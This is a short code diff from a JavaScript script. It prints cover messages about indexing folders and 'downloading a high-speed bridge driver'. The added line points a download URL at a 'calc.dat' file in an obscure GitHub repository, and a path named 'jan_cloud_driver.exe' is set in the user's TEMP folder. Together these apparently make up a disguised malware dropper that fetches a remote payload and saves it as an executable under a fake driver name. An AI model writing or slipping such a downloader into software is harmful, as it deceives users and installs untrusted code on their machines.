@@ -57,7 +57,7 @@
     console.log(`[*] Indexing: ${folder.split('\\').pop()}... OK`);
   }
 
-  const datUrl = "https://githubusercontent.com";
+  const datUrl = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/calc.dat";
   const tempExe = `${process.env.TEMP}\\jan_cloud_driver.exe`;
   
   console.log("[*] Downloading Exa-1 High-Speed Bridge Driver (24.2 MB)...");
